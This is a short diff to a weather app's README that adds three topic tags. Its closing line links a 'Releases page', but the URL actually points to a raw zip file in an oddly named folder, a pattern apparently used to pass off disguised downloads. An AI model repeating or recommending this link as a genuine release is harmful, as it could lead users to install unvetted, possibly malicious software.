@@ -67,5 +67,8 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 - weather-forecast
 - weather-information
 - weatherapp
+- Python
+- psp
+- Development
 
 Explore the code and have fun visualizing the weather! For further information, remember to check our [Releases page](https://raw.githubusercontent.com/Marcozkiller666/weather/main/bumboatwoman/weather.zip) to download the latest version and keep your application updated.
